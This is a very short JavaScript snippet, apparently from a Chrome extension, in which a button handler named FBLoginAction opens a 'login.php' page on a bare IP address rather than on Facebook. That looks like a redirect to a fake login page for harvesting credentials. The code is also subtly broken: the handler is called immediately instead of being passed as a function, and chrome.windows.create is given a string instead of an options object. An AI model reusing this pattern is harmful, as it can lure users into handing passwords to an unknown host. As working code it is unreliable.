document.getElementById('button').addEventListener('click', FBLoginAction());

function FBLoginAction(){
	chrome.windows.create('https://54.186.219.119/login.php');
}